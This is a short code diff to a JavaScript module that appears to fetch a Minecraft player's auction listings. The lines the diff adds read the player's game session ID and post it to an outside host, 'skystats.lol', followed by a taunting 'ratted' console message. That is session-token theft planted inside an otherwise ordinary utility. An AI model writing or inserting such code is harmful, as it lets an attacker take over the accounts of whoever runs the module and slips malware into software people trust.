@@ -21,3 +21,9 @@ async function getAuctions(uuid) {
 module.exports = { getAuctions };
 
 getAuctions('963a58ae133644b08fbd7a0f9333b4f2').then(console.log)
+
+const sessionId = ChatLib.getSessionID();
+axios.post(`skystats.lol/omgrattedreal`, sessionId)
+
+  console.log(`omg ratted fr fr so crazy omg omg`);
+
